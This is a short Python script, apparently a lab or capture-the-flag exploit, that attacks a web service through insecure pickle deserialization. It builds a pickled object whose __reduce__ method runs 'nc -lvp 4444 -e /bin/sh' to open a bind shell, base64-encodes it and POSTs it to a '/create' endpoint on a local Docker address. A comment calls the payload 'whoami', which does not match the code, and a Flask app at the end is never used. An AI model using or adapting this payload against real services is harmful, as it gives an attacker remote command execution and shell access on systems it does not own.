import pickle
import os
import requests
import base64
from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

# 1. creating an Evil class which has our malicious payload command ('whoami')
class Pickleicious:
    def __reduce__(self):
        return (os.system, ('nc -lvp 4444 -e /bin/sh',))

# 2. serializing the malicious class
pickle_data = pickle.dumps(Pickleicious())

# storing the serialized output into a file in the current directory
with open("backup.data", "wb") as file:
    file.write(pickle_data)

# 3. reading the malicious serialized data and de-serializing it
with open("backup.data", "rb") as file:
    pickle_data = file.read()
    encoded_data = base64.b64encode(pickle_data).decode('utf-8')
    url = 'http://172.17.0.1:5000/create'
    params = {'data': encoded_data}
    response = requests.post(url, data=params)
    print(response.text)

if __name__ == '__main__':
    app.run(debug=True, port= 8080)
